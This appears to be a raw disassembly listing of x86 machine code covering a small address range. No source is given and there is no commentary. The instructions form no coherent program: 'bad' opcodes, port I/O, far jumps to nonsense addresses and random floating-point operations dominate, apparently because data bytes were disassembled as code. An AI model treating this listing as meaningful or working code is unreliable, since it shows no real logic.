  42473b:	or     ch,cl
  42473d:	loope  0x424748
  42473f:	add    BYTE PTR ds:0xc2cedec4,cl
  424745:	in     eax,0xd5
  424747:	mov    ah,0xfb
  424749:	out    0xdb,eax
  42474b:	fld    st(6)
  42474d:	mov    edx,0xf7d4d2e4
  424752:	repz out 0xce,eax
  424755:	ret    
  424756:	repz mov edx,0xdffdf5bc
  42475c:	push   es
  42475d:	imul   dh
  42475f:	leave  
  424760:	(bad)  
  424761:	fnstenv [ecx-0xd39363d]
  424767:	aad    0xc7
  424769:	repnz loopne 0x424732
  42476c:	into   
  42476d:	fcmovu st,st(0)
  42476f:	retf   0xd8cb
  424772:	(bad)  
  424773:	sar    edx,1
  424775:	(bad)  
  424776:	loop   0x424757
  424778:	aam    0x0
  42477a:	lds    eax,FWORD PTR [ecx]
  42477c:	(bad)  
  42477e:	add    ch,bh
  424780:	std    
  424781:	rcr    ch,0xef
  424784:	retf   
  424785:	lods   al,BYTE PTR ds:[esi]
  424786:	into   
  424787:	hlt    
  424788:	mov    ah,0xea
  42478a:	call   0xeb1a2e7b
  42478f:	(bad)  
  424790:	jmp    0x42476f
  424792:	in     eax,dx
  424793:	shr    ebp,cl
  424795:	in     eax,dx
  424796:	mov    edi,0xddd6ffba
  42479b:	push   es
  42479c:	mov    ebp,0xfc13cfcb
  4247a1:	adc    cl,ch
  4247a3:	mov    esp,0xb7d0c4f7
  4247a8:	ret    0xb3ac
  4247ab:	mov    edx,0xbbc8f6c6
  4247b0:	neg    ebp
  4247b2:	out    dx,eax
  4247b3:	div    dh
  4247b5:	mov    edi,0xb8d6c4c0
  4247ba:	add    ch,ah
  4247bc:	or     edx,esi
  4247be:	out    dx,al
  4247bf:	fucomp st(4)
  4247c1:	or     eax,0xc2d1a9f2
  4247c6:	fst    st(3)
  4247c8:	out    0xce,al
  4247ca:	call   0xe9f33894
  4247cf:	fdivr  QWORD PTR [esp+esi*4-0x2b1f33]
  4247d6:	loope  0x4247da
  4247d8:	loope  0x4247da
  4247da:	fild   DWORD PTR [ecx]
  4247dc:	or     esi,ebp
  4247de:	in     al,0xa
  4247e0:	clc    
  4247e1:	adc    bl,bh
  4247e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4247e4:	jecxz  0x4247aa
  4247e6:	shl    ecx,1
  4247e8:	jmp    0xc9ea:0xd6c9caf5
  4247ef:	cmc    
  4247f0:	fcmovnu st,st(2)
  4247f2:	cli    
  4247f3:	loopne 0x4247c4
  4247f5:	push   es
  4247f6:	repz aam 0x3
  4247f9:	jmp    0xd4d4:0xe7f4fef5
  424800:	loopne 0x4247e7
  424802:	shl    ebx,0xf0
  424805:	out    dx,eax
  424806:	mov    ch,0xf6
  424808:	cmc    
  424809:	shl    cl,0xee
  42480c:	idiv   BYTE PTR [edi-0x2431422c]
  424812:	(bad)  
  424814:	push   es
  424815:	fld    QWORD PTR ds:0xcae9e30b
  42481b:	add    ah,dh
  42481d:	(bad)
  424820:	in     al,0xda
  424822:	loopne 0x424816
  424824:	imul   ch
  424826:	mov    bh,0xe7
  424828:	in     eax,0xc9
  42482a:	mov    bl,0xef
  42482c:	call   0xdc302def
  424831:	fucomp st(6)
  424833:	iret   
  424834:	aam    0xf5
  424836:	fadd   st,st(3)
  424838:	(bad)
  42483b:	jecxz  0x424833
  42483d:	cmc    
  42483e:	call   0xaa554841
  424843:	fst    st(6)
  424845:	mov    cl,0xc9
  424847:	scas   al,BYTE PTR es:[edi]
  424848:	into   
  424849:	jmp    0xddcc:0xc9f2ecf7
  424850:	mov    cl,0xdc
  424852:	(bad)  
  424854:	iret   
  424855:	add    eax,0xcaddf5fc
  42485a:	in     eax,0x1
  42485c:	(bad)
  42485f:	fxch   st(1)
  424861:	iret   
  424862:	in     al,0xd7
  424864:	loopne 0x42480e
  424866:	ror    eax,0xc0
  424869:	ret    0xc7d9
  42486c:	mov    ebx,0xf1d1b7be
  424871:	add    dh,cl
  424873:	test   bl,0xcd
  424876:	(bad)  
  424877:	fadd   st,st(6)
  424879:	add    ebx,ecx
  42487b:	add    al,0xeb
  42487d:	push   cs
  42487e:	add    eax,0xaff8f2cd
  424883:	(bad)
  424887:	sar    dl,1
  424889:	loopne 0x424870
  42488b:	sar    edx,cl
  42488d:	cli    
  42488e:	ror    dl,1
  424890:	cli    
  424891:	mov    ebp,0xb4b8d502
  424896:	(bad)  
  424898:	cmc    
  424899:	fnstsw WORD PTR [edi+0x2fff7cb]
  42489f:	stc    
  4248a0:	pop    es
  4248a1:	por    mm1,mm5
  4248a4:	mov    al,0xc2
  4248a6:	enter  0xd0aa,0xd5
  4248aa:	lock int 0xd9
  4248ad:	std    
  4248ae:	lock fcmovu st,st(4)
  4248b1:	in     eax,dx
  4248b2:	hlt    
  4248b3:	hlt    
  4248b4:	mov    eax,0xd8ecc7dd
  4248b9:	add    DWORD PTR [ecx],ecx
  4248bb:	fsubp  st(0),st
  4248bd:	leave  
  4248be:	jmp    0xe11b11d1
  4248c3:	ret    0xf0d7
  4248c6:	mov    bl,0xc7
  4248c8:	mov    ch,0xea
  4248ca:	enter  0xfeb8,0xf9
  4248ce:	mov    edx,0xe9edfdd5
  4248d3:	repz cmc 
  4248d5:	fst    st(5)
  4248d7:	fld    DWORD PTR [ebx]
  4248d9:	add    eax,0xebd7e608
  4248de:	psrad  mm3,mm4
  4248e1:	in     al,dx
  4248e2:	stos   BYTE PTR es:[edi],al
  4248e3:	in     eax,0xd7
  4248e5:	mov    dl,0xf3
  4248e7:	mov    dh,0xf0
  4248e9:	idiv   DWORD PTR [ecx-0x42413b0f]
  4248ef:	fadd   QWORD PTR [edx]
  4248f1:	fdivr  st,st(3)
  4248f3:	mov    edi,0x6fcf4fa
  4248f8:	shr    dl,1
  4248fa:	jmp    0xf9ee:0xafbebc1
  424901:	fucomip st,st(3)
  424903:	mov    dl,0xb7
  424905:	jmp    0x4248f1
  424907:	lods   eax,DWORD PTR ds:[esi]
  424908:	sar    BYTE PTR [ebx-0x2a041a45],0xe8
  42490f:	mov    ebp,0xe3baf4b8
  424914:	(bad)  
  424916:	fdiv   st,st(2)
  424918:	sar    dl,cl
  42491a:	(bad)  [ebx]
  42491c:	add    al,BYTE PTR [ebx]
  42491e:	jecxz  0x4248fc
  424920:	out    0x3,eax
  424922:	scas   eax,DWORD PTR es:[edi]
  424923:	out    0xe9,eax
  424925:	int    0xce
  424927:	vpmuludq ymm6,ymm1,ymm2
  42492b:	mov    edx,0xf4ddbaf1
  424930:	fidivr DWORD PTR [eax-0xe2d450c]
  424936:	aam    0xff
  424938:	pop    es
  424939:	xlat   BYTE PTR ds:[ebx]
  42493a:	or     bl,ah
  42493c:	add    ch,dl
  42493e:	add    esp,edi
  424940:	(bad)  
  424942:	retf   0xbec0
  424945:	icebp  
  424946:	fsub   st(0),st
  424948:	in     eax,dx
  424949:	mov    dh,0xe4
  42494b:	leave  
  42494c:	(bad)  
  42494d:	in     eax,dx
  42494e:	clc    
  42494f:	in     eax,dx
  424950:	hlt    
  424951:	mov    ebx,0xb5f9d6
  424956:	icebp  
  424957:	add    ebx,edi
  424959:	(bad)
  42495e:	in     eax,dx
  42495f:	sti    
  424960:	out    0xe0,eax
  424962:	retf   0xf6c0
  424965:	mov    esi,0xd1f5d2c9
  42496a:	fcmovu st,st(1)
  42496c:	mov    dh,0xee
  42496e:	lock sar bh,cl
  424971:	add    esi,ebp
  424973:	std    
  424974:	fiadd  DWORD PTR [edi]
  424976:	out    0xe5,al
  424978:	cli    
  424979:	mov    eax,0x608caf9
  42497e:	add    eax,ecx
  424980:	cli    
  424981:	or     al,0xf2
  424983:	rcl    esi,cl
  424985:	call   0xc70df741
  42498a:	scas   eax,DWORD PTR es:[edi]
  42498b:	mov    dl,0xb4
  42498d:	leave  
  42498e:	jmp    0xd8d2:0xbbc8caf4
  424995:	push   es
  424996:	out    0xc5,eax
  424998:	retf   
  424999:	(bad)  
  42499a:	retf   
  42499b:	fimul  WORD PTR [edi]
  42499d:	ror    BYTE PTR ds:0xf1d808d4,0xe2
  4249a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4249a5:	rcl    dl,cl
  4249a7:	(bad)  
  4249a8:	mov    al,0xc4
  4249aa:	mov    ecx,0xefcbefd5
  4249af:	mov    ah,0xec
  4249b1:	idiv   eax
  4249b3:	fsubp  st(6),st
  4249b5:	cli    
  4249b6:	add    dl,ah
  4249b8:	fnstsw WORD PTR [esi+eiz*8+0xbc90e00]
  4249bf:	(bad)  
  4249c1:	in     eax,0xc0
  4249c3:	(bad)  
  4249c5:	iret   
  4249c6:	(bad)  
  4249c7:	retf   
  4249c8:	loopne 0x42497c
  4249ca:	repz mov cl,0xbb
  4249cd:	iret   
  4249ce:	mov    ch,0xea
  4249d0:	out    dx,eax
  4249d1:	out    dx,al
  4249d2:	out    dx,al
  4249d3:	cmc    
  4249d4:	fcomp  st(1)
  4249d6:	fidivr WORD PTR [esi-0x1d272f22]
  4249dc:	jmp    0xff2d52c5
  4249e1:	pop    es
  4249e2:	ror    edx,1
  4249e4:	call   0xd4f32e95
  4249e9:	aad    0xcb
  4249eb:	cli    
  4249ec:	xbegin 0xfef437b6
  4249f2:	in     al,dx
  4249f3:	int3   
  4249f4:	fcomp  st(0)
  4249f6:	cld    
  4249f7:	loope  0x4249f1
  4249f9:	add    eax,0xdde5f6c2
  4249fe:	(bad)  
  4249ff:	into   
  424a00:	cld    
  424a01:	add    eax,0xc0ecdcbe
  424a06:	int    0xb1
  424a08:	mov    ebx,0xf4cee1c7
  424a0d:	clc    
  424a0e:	iret   
  424a0f:	mov    ebp,0xf8f9b8f3
  424a14:	add    edi,esi
  424a16:	aam    0xbc
  424a18:	in     al,0xe4
  424a1a:	hlt    
  424a1b:	rcr    eax,0x0
  424a1e:	jmp    0xd84430fe
  424a23:	test   al,0xf7
  424a25:	mov    ebp,0xc9d2c7f0
  424a2a:	jmp    0xdb011d21
  424a2f:	sar    ch,1
  424a31:	aam    0xf6
  424a33:	cld    
  424a34:	add    edi,ebp
  424a36:	cmc    
  424a37:	(bad)  
  424a38:	(bad)  
  424a39:	out    0xca,al
  424a3b:	retf   
  424a3c:	pmaddwd mm4,mm0
  424a3f:	out    dx,eax
  424a40:	push   cs
  424a41:	(bad)  
  424a43:	out    0xc8,eax
  424a45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424a46:	cmc    
  424a47:	jmp    0x424a43
  424a49:	loop   0x424a0f
  424a4b:	loopne 0x424a16
  424a4d:	ror    ch,1
  424a4f:	out    dx,eax
  424a50:	cld    
  424a51:	(bad)  
  424a53:	mov    ebp,0xb07f501
  424a58:	add    al,0xf9
  424a5a:	lock std 
  424a5c:	mov    ebp,0xfce4e1d8
  424a61:	frstor [edi-0x311b5637]
  424a67:	(bad)  
  424a68:	lds    esi,FWORD PTR [esi-0x292c382d]
  424a6e:	mov    edi,0xfdfbe9fa
  424a73:	inc    BYTE PTR [ebx]
  424a75:	loop   0x424a70
  424a77:	loopne 0x424a35
  424a79:	add    eax,0xfe50fe3
  424a7e:	stc    
  424a7f:	out    dx,eax
  424a80:	jmp    0xea310f85
  424a85:	jmp    0xe2f2fe3c
  424a8a:	(bad)  
  424a8c:	stc    
  424a8d:	out    dx,eax
  424a8e:	shr    dl,cl
  424a90:	int3   
  424a91:	add    ebx,esp
  424a93:	sar    bh,0xe7
  424a96:	ret    
  424a97:	loopne 0x424a6a
  424a99:	or     ebx,ebp
  424a9b:	cld    
  424a9c:	hlt    
  424a9d:	add    ebp,edx
  424a9f:	enter  0xdd02,0xcd
  424aa3:	mov    dl,0xe9
  424aa5:	jmp    0xcdfe358c
  424aaa:	mov    ah,0xd3
  424aac:	idiv   cl
  424aae:	fdivp  st(3),st
  424ab0:	mov    ebx,0xbcc8e8d4
  424ab5:	mul    bh
  424ab7:	out    0x3,al
  424ab9:	ffreep st(4)
  424abb:	fmul   DWORD PTR [edx]
  424abd:	push   es
  424abe:	pop    es
  424abf:	(bad)  
  424ac1:	jmp    FWORD PTR [ecx-0x172a1953]
  424ac7:	(bad)  
  424ac8:	(bad)
  424acb:	xlat   BYTE PTR ds:[ebx]
  424acc:	enter  0xd4d5,0xfb
  424ad0:	mov    esp,0xefe2f9cf
  424ad5:	in     eax,dx
  424ad6:	loopne 0x424a98
  424ad8:	ret    
  424ad9:	add    eax,DWORD PTR [ecx]
  424adb:	retf   0xeafd
  424ade:	mov    esp,0xd8cf0fd9
  424ae4:	jecxz  0x424ac4
  424ae6:	loopne 0x424acd
  424ae8:	ret    
  424ae9:	icebp  
  424aea:	out    dx,al
  424aeb:	fbstp  TBYTE PTR [esi-0x33071250]
  424af1:	fnclex 
  424af3:	loopne 0x424ad1
  424af5:	in     eax,0xbc
  424af7:	in     al,dx
  424af8:	fld    DWORD PTR [ecx]
  424afa:	(bad)  
  424afc:	add    ch,dh
  424afe:	out    dx,eax
  424aff:	cld    
  424b00:	int3   
  424b01:	out    0xca,eax
  424b03:	mov    dl,0xb3
  424b05:	out    dx,eax
  424b06:	shl    ebp,cl
  424b08:	fstp   TBYTE PTR [edx-0x103a3f3a]
  424b0e:	hlt    
  424b0f:	jmp    0xd201:0xfee1ede3
  424b16:	cli    
  424b17:	mov    esi,0xf7c6bcf6
  424b1c:	cli    
  424b1d:	(bad)  
  424b1f:	or     ecx,esi
  424b21:	int    0xc7
  424b23:	fsub   st(1),st
  424b25:	jmp    0xce093df5
  424b2a:	mov    ebx,0xb5d5cec7
  424b2f:	repz cmc 
  424b31:	int3   
  424b32:	sar    al,1
  424b34:	stc    
  424b35:	div    ch
  424b37:	ret    
  424b38:	(bad)  
  424b39:	clc    
  424b3a:	mov    edx,0xe1cf00ee
  424b40:	adc    cl,ch
  424b42:	fcomp  st(7)
  424b44:	ret    
  424b45:	call   0xb4fa10fd
  424b4a:	rcl    eax,1
  424b4c:	(bad)  
  424b4e:	repnz add esi,edi
  424b51:	in     al,dx
  424b52:	in     eax,dx
  424b53:	aam    0xf1
  424b55:	mov    eax,0xe2e6f6db
  424b5a:	aam    0x5
  424b5c:	add    ch,ch
  424b5e:	out    0xc4,eax
  424b60:	or     ebp,esi
  424b62:	retf   0xf7b8
  424b65:	xlat   BYTE PTR ds:[ebx]
  424b66:	mov    ebp,0xf5dbfbdb
  424b6b:	loopne 0x424b52
  424b6d:	mov    ecx,0xe802f3fe
  424b72:	mov    esi,0xf703dbbc
  424b77:	fldl2e 
  424b79:	fld    QWORD PTR [esi]
  424b7b:	(bad)  
  424b7d:	or     DWORD PTR [ebx+edi*8],ecx
  424b80:	jmp    0x424b82
  424b82:	rol    al,cl
  424b84:	mov    esp,0xe8d3c6e6
  424b89:	aam    0xed
  424b8b:	scas   al,BYTE PTR es:[edi]
  424b8c:	iret   
  424b8d:	iret   
  424b8e:	cli    
  424b8f:	ror    ch,cl
  424b91:	leave  
  424b92:	mov    esp,0xe7d9f9fc
  424b97:	out    0xfa,eax
  424b99:	clc    
  424b9a:	cld    
  424b9b:	(bad)  
  424b9c:	mov    ebp,0x13cd070d
  424ba1:	into   
  424ba2:	ret    
  424ba3:	in     al,0xc4
  424ba5:	jecxz  0x424b63
  424ba7:	in     al,dx
  424ba8:	lock lock sti 
  424bab:	(bad)  
  424bac:	rcr    eax,1
  424bae:	in     eax,0xfb
  424bb0:	int    0xdc
  424bb2:	cmc    
  424bb3:	std    
  424bb4:	ret    0xf8c0
  424bb7:	(bad)  
  424bb9:	or     edi,DWORD PTR [edi+0xaebc607]
  424bbf:	out    0x0,eax
  424bc1:	loope  0x424b7f
  424bc3:	leave  
  424bc4:	(bad)  
  424bc5:	mov    al,0xe9
  424bc7:	loope  0x424baf
  424bc9:	aam    0xc7
  424bcb:	mov    edx,0xdfbeb5e4
  424bd0:	repnz aam 0xfe
  424bd3:	fild   DWORD PTR [eax]
  424bd5:	(bad)  
  424bd7:	test   DWORD PTR [edi+eax*8],0xc7f4e1f8
  424bde:	or     al,0xeb
  424be0:	(bad)  
  424be2:	shr    esp,0xb3
  424be5:	into   
  424be6:	stos   DWORD PTR es:[edi],eax
  424be7:	ret    0xd2cd
  424bea:	int3   
  424beb:	scas   al,BYTE PTR es:[edi]
  424bec:	not    ch
  424bee:	shl    esi,1
  424bf0:	in     al,dx
  424bf1:	(bad)  
  424bf2:	cli    
  424bf3:	lock (bad) 
  424bf6:	aad    0xcc
  424bf8:	neg    cl
  424bfa:	(bad)  
  424bfc:	sti    
  424bfd:	iret   
  424bfe:	fsubp  st(2),st
  424c00:	adc    edx,DWORD PTR [ebx]
  424c02:	mov    edi,0xf4c3d7af
  424c07:	int    0xed
  424c09:	mov    dl,0xf8
  424c0b:	int3   
  424c0c:	(bad)  
  424c0d:	sti    
  424c0e:	into   
  424c0f:	sar    DWORD PTR [edx-0x121e3141],1
  424c15:	rol    bh,0xd3
  424c18:	cmc    
  424c19:	(bad)  
  424c1b:	rol    DWORD PTR [ecx],0xb
  424c1e:	int    0xfe
  424c20:	add    cl,BYTE PTR [esi]
  424c22:	fsubrp st(7),st
  424c24:	scas   eax,DWORD PTR es:[edi]
  424c25:	loope  0x424bfc
  424c27:	out    0xf2,al
  424c29:	out    0xb7,eax
  424c2b:	fdecstp 
  424c2d:	stc    
  424c2e:	in     eax,dx
  424c2f:	(bad)  
  424c30:	mov    esi,0xfec001c9
  424c35:	out    0xf6,eax
  424c37:	rol    bl,0xbc
  424c3a:	in     al,0xd8
  424c3c:	fisttp DWORD PTR [edi]
  424c3e:	jecxz  0x424c1f
  424c40:	shl    edx,0xf1
  424c43:	in     eax,0xe3
  424c45:	retf   0xc9d7
  424c48:	ror    esp,1
  424c4a:	mov    dl,0xe7
  424c4c:	mov    cl,0xdb
  424c4e:	out    dx,al
  424c4f:	sti    
  424c50:	mov    ecx,0xfaf1d4ff
  424c55:	in     eax,0xe1
  424c57:	mov    esi,0x307fad2
  424c5c:	xlat   BYTE PTR ds:[ebx]
  424c5d:	sti    
  424c5e:	shufps xmm4,xmm6,0xf8
  424c62:	lods   eax,DWORD PTR ds:[esi]
  424c63:	in     al,0xe6
  424c65:	lods   al,BYTE PTR ds:[esi]
  424c66:	jmp    0xc51d425e
  424c6b:	fdivr  DWORD PTR [ecx-0x2a144707]
  424c71:	icebp  
  424c72:	add    edi,ecx
  424c74:	fdiv   st(7),st
  424c76:	add    cl,ah
  424c78:	shl    eax,1
  424c7a:	rol    BYTE PTR [ebx],1
  424c7c:	add    eax,0xe8e9cbff
  424c81:	out    0xcf,al
  424c83:	lods   eax,DWORD PTR ds:[esi]
  424c84:	(bad)  
  424c85:	imul   esp
  424c87:	bnd ret 
  424c89:	les    esi,FWORD PTR [edi+esi*4-0x2122e07]
  424c90:	std    
  424c91:	fcmovnu st,st(7)
  424c93:	icebp  
  424c94:	add    ebp,esp
  424c96:	aad    0xba
  424c98:	cmc    
  424c99:	hlt    
  424c9a:	(bad)  
  424c9c:	rcr    edx,0x1
  424c9f:	les    eax,FWORD PTR [edi]
  424ca1:	repz in al,0xc1
  424ca4:	in     al,dx
  424ca5:	jecxz  0x424c6a
  424ca7:	in     eax,dx
  424ca8:	sti    
  424ca9:	cli    
  424caa:	into   
  424cab:	jmp    0xf5da:0xf7d4d3cc
  424cb2:	mov    esp,0xf2e2d4d1
  424cb7:	stc    
  424cb8:	add    cl,bl
  424cba:	aam    0xc4
  424cbc:	fimul  DWORD PTR [edx]
  424cbe:	leave  
  424cbf:	out    0xe1,eax
  424cc1:	add    ah,cl
  424cc3:	call   0xecf543b5
  424cc8:	jecxz  0x424c8c
  424cca:	loopne 0x424cac
  424ccc:	fcmovnb st,st(4)
  424cce:	rol    esp,cl
  424cd0:	fcmovnu st,st(0)
  424cd2:	add    dl,dl
  424cd4:	out    0xbf,eax
  424cd6:	in     al,dx
  424cd7:	inc    bl
  424cd9:	jecxz  0x424cda
  424cdb:	ret    0xffeb
  424cde:	retf   0xdde8
  424ce1:	repz in al,0xcf
  424ce4:	fidiv  WORD PTR [ecx-0x383e2f2d]
  424cea:	hlt    
  424ceb:	mov    dl,0xfb
  424ced:	fidivr WORD PTR [ebx-0x81d3424]
  424cf3:	(bad)  
  424cf4:	fld    DWORD PTR [eax]
  424cf6:	fld    st(6)
  424cf8:	fmul   QWORD PTR [ebx]
  424cfa:	add    ch,cl
  424cfc:	out    dx,eax
  424cfd:	enter  0xfddc,0xec
  424d01:	or     eax,0xeee8c3a9
  424d06:	mov    ch,0xcf
  424d08:	(bad)
  424d0b:	fsincos 
  424d0d:	clc    
  424d0e:	aad    0xd1
  424d10:	loop   0x424d11
  424d12:	cli    
  424d13:	std    
  424d14:	fucom  st(5)
  424d16:	ret    
  424d17:	cld    
  424d18:	shl    ah,0xc5
  424d1b:	add    eax,0xe201c0bd
  424d20:	fsubrp st(6),st
  424d22:	call   0xe929fd05
  424d27:	out    0xcc,eax
  424d29:	leave  
  424d2a:	fdivr  st,st(2)
  424d2c:	mov    ah,0xd2
  424d2e:	f2xm1  
  424d30:	call   0xf52a4b28
  424d35:	add    dh,bl
  424d37:	mov    esp,0xc1ffd2da
  424d3c:	retf   0xfc4
  424d3f:	call   0xe4eb1844
  424d44:	shr    eax,1
  424d46:	int3   
  424d47:	repz jmp 0xe93b221c
  424d4d:	aad    0xdf
  424d4f:	out    dx,al
  424d50:	sar    DWORD PTR [esi-0x3947052b],cl
  424d56:	inc    edi
  424d58:	add    ecx,eax
  424d5a:	fucomi st,st(0)
  424d5c:	out    0xd8,eax
  424d5e:	leave  
  424d5f:	or     al,0xfa
  424d61:	(bad)  
  424d63:	mov    dl,0xa5
  424d65:	retf   
  424d66:	hlt    
  424d67:	sti    
  424d68:	loope  0x424d1f
  424d6a:	repnz ror ah,cl
  424d6d:	in     eax,0xf5
  424d6f:	mov    dh,0xb1
  424d71:	retf   0xce
  424d74:	sar    esp,0xc2
  424d77:	cld    
  424d78:	rol    dh,1
  424d7a:	in     eax,0xd8
  424d7c:	retf   0xecfe
  424d7f:	in     eax,0xd
  424d81:	fmul   st(1),st
  424d83:	in     al,0xf7
  424d85:	lods   eax,DWORD PTR ds:[esi]
  424d86:	int3   
  424d87:	jmp    0xe4fe3780
  424d8c:	rcl    cl,1
  424d8e:	fstp   st(3)
  424d90:	add    edi,esp
  424d92:	hlt    
  424d93:	shl    BYTE PTR [ebp-0x27001d10],1
  424d99:	idiv   esi
  424d9b:	or     ah,ch
  424d9d:	sti    
  424d9e:	fdiv   st(2),st
  424da0:	add    al,0xe4
  424da2:	loopne 0x424d52
  424da4:	jmp    0xc70a3a71
  424da9:	mov    edx,0xb7cffad1
  424dae:	fucomip st,st(2)
  424db0:	in     eax,dx
  424db1:	div    cl
  424db3:	add    dh,dh
  424db5:	cld    
  424db6:	push   es
  424db7:	out    0xe2,eax
  424db9:	or     eax,eax
  424dbb:	jecxz  0x424d98
  424dbd:	jmp    0xf027399c
  424dc2:	mov    bl,0xbf
  424dc4:	ffree  st(6)
  424dc6:	repz mov bl,0xcb
  424dc9:	mov    bl,0xf6
  424dcb:	out    0xeb,al
  424dcd:	les    esi,FWORD PTR [edi+edi*4-0xe0e3c25]
  424dd4:	ret    0xc2c1
  424dd7:	sar    ebp,cl
  424dd9:	std    
  424dda:	add    esp,edi
  424ddc:	jmp    0x424dba
  424dde:	fcomp  st(3)
  424de0:	adc    eax,DWORD PTR [ecx]
  424de2:	retf   
  424de3:	ror    ecx,cl
  424de5:	out    0xd5,al
  424de7:	stos   BYTE PTR es:[edi],al
  424de8:	out    0xd3,eax
  424dea:	(bad)  
  424deb:	(bad)  
  424dec:	jmp    0x424dd6
  424dee:	(bad)  
  424df0:	clc    
  424df1:	loop   0x424dc8
  424df3:	fnsave [ebp-0x81a1a1e]
  424df9:	retf   0x2c5
  424dfc:	cli    
  424dfd:	add    esi,esp
  424dff:	or     dh,ah
  424e01:	rol    ebp,cl
  424e03:	(bad)  
  424e04:	out    dx,al
  424e05:	xlat   BYTE PTR ds:[ebx]
  424e06:	rcl    edx,1
  424e08:	sar    dl,cl
  424e0a:	shl    BYTE PTR [edx-0x415114b],1
  424e10:	(bad)  
  424e11:	(bad)  
  424e12:	inc    ebx
  424e14:	fstp   TBYTE PTR [edi+0x2fee6d5]
  424e1a:	in     eax,0xc2
  424e1c:	fcmovnb st,st(0)
  424e1e:	aam    0xeb
  424e20:	adc    ebx,edi
  424e22:	mov    bl,0xbc
  424e24:	(bad)
  424e28:	cli    
  424e29:	mov    bl,0xec
  424e2b:	mov    ch,0xd6
  424e2d:	frstpm(287 only) 
  424e2f:	enter  0xefe8,0xde
  424e33:	idiv   DWORD PTR [esi+eax*1+0xbf3f2de]
  424e3a:	stc    
  424e3b:	or     al,ah
  424e3d:	inc    DWORD PTR ds:0xa9d813dc
  424e43:	repz rcr esi,cl
  424e46:	(bad)  
  424e47:	mov    cl,0xad
  424e49:	cmc    
  424e4a:	mov    bl,0xf3
  424e4c:	les    esi,FWORD PTR [edi-0x7fd3725]
  424e52:	loop   0x424e0c
  424e54:	sar    eax,1
  424e56:	hlt    
  424e57:	inc    edi
  424e59:	add    eax,0xeeac2bf
  424e5e:	int    0xea
  424e60:	ror    DWORD PTR [ecx],0xe0
  424e63:	(bad)
  424e66:	cmc    
  424e67:	icebp  
  424e68:	retf   0xe5d4
  424e6b:	mov    cl,0xb7
  424e6d:	fcmovu st,st(5)
  424e6f:	repz in eax,dx
  424e71:	retf   0xc2ff
  424e74:	fcmovnbe st,st(2)
  424e76:	add    ebp,esp
  424e78:	xlat   BYTE PTR ds:[ebx]
  424e79:	in     al,0xf5
  424e7b:	retf   
  424e7c:	jecxz  0x424e83
  424e7e:	out    dx,al
  424e7f:	out    0xfd,al
  424e81:	add    al,0xeb
  424e83:	int3   
  424e84:	div    ecx
  424e86:	jmp    0xe91a307e
  424e8b:	icebp  
  424e8c:	mov    ecx,0xcfd9dfb8
  424e91:	(bad)  
  424e93:	lock int3 
  424e95:	mul    dl
  424e97:	(bad)  
  424e98:	std    
  424e99:	neg    ch
  424e9b:	jmp    esp
  424e9d:	jmp    0xbdb2:0xeeefdc02
  424ea4:	leave  
  424ea5:	vpaddsb xmm1,xmm3,xmm2
  424ea9:	shl    eax,cl
  424eab:	xlat   BYTE PTR ds:[ebx]
  424eac:	mov    bh,0xcb
  424eae:	mov    ebp,0xd7bbb9f6
  424eb3:	dec    dh
  424eb5:	(bad)  
  424eb7:	std    
  424eb8:	(bad)  
  424eb9:	or     ebx,eax
  424ebb:	retf   0xf8
  424ebe:	out    0xeb,eax
  424ec0:	or     cl,cl
  424ec2:	in     eax,0xc4
  424ec4:	ror    dl,0xaf
  424ec7:	in     al,dx
  424ec8:	shl    DWORD PTR [esi-0x3019312f],1
  424ece:	call   0xe44144c8
  424ed3:	push   esi
  424ed5:	rol    bh,cl
  424ed7:	out    0xf1,eax
  424ed9:	(bad)  
  424eda:	mov    edi,0xcbddcb03
  424edf:	in     eax,0xdb
  424ee1:	fdiv   DWORD PTR [edx-0xc324014]
  424ee7:	les    esi,FWORD PTR [edx+eiz*8-0x102c0530]
  424eee:	in     eax,dx
  424eef:	mov    esp,0xfcecd2b8
  424ef4:	pop    es
  424ef5:	(bad)  
  424ef6:	aad    0xde
  424ef8:	stc    
  424ef9:	std    
  424efa:	inc    ecx
  424efc:	sar    edi,0x5
  424eff:	int3   
  424f00:	fldz   
  424f02:	repz scas eax,DWORD PTR es:[edi]
  424f04:	ret    0xc2e8
  424f07:	imul   bl
  424f09:	repz enter 0xf5ae,0xb6
  424f0e:	mov    ah,0xfe
  424f10:	mov    esp,0xc7d501d3
  424f15:	pop    es
  424f16:	add    edi,ebp
  424f18:	(bad)  
  424f19:	push   es
  424f1a:	hlt    
  424f1b:	idiv   bl
  424f1d:	les    eax,FWORD PTR [edx+ebp*8]
  424f20:	fisttp QWORD PTR [edx]
  424f22:	stos   DWORD PTR es:[edi],eax
  424f23:	loope  0x424f05
  424f25:	in     al,0xd0
  424f27:	(bad)  
  424f28:	in     eax,dx
  424f29:	in     eax,dx
  424f2a:	hlt    
  424f2b:	stc    
  424f2c:	in     al,0xdf
  424f2e:	in     al,dx
  424f2f:	imul   dh
  424f31:	icebp  
  424f32:	rcr    ebx,0xf8
  424f35:	rol    BYTE PTR [edx],0x4
  424f38:	cld    
  424f39:	cli    
  424f3a:	shr    bh,0x9
  424f3d:	or     dh,bl
  424f3f:	pop    es
  424f40:	std    
  424f41:	shl    ah,0xc4
  424f44:	leave  
  424f45:	shr    ah,1
  424f47:	fld    TBYTE PTR [ebp-0x2f46294d]
  424f4d:	div    bl
  424f4f:	in     al,dx
  424f50:	in     al,dx
  424f51:	mov    ebx,0x7eceeda
  424f56:	cld    
  424f57:	in     eax,0xe3
  424f59:	sar    ecx,1
  424f5b:	(bad)
  424f5e:	jmp    0xbcc1:0xd308e7ef
  424f65:	jmp    0xd8082654
  424f6a:	icebp  
  424f6b:	enter  0xebc4,0xbb
  424f6f:	mov    dl,0xfa
  424f71:	sar    al,1
  424f73:	fcomi  st,st(6)
  424f75:	mov    edi,0xd0c0bdf4
  424f7a:	std    
  424f7b:	out    0xd4,eax
  424f7d:	out    0xd5,al
  424f7f:	leave  
  424f80:	in     al,0xe9
  424f82:	lock fsubr QWORD PTR [eax-0x2b2b352f]
  424f89:	shl    DWORD PTR [ebp-0x41350c20],0xba
  424f90:	ret    
  424f91:	aad    0xef
  424f93:	clc    
  424f94:	(bad)  
  424f95:	std    
  424f96:	(bad)  
  424f97:	repz in eax,0xd5
  424f9a:	add    ebx,ebp
  424f9c:	loopne 0x424f86
  424f9e:	jmp    0xb8555fa1
  424fa3:	test   al,0xa8
  424fa5:	int3   
  424fa6:	(bad)  
  424fa7:	in     eax,0xdb
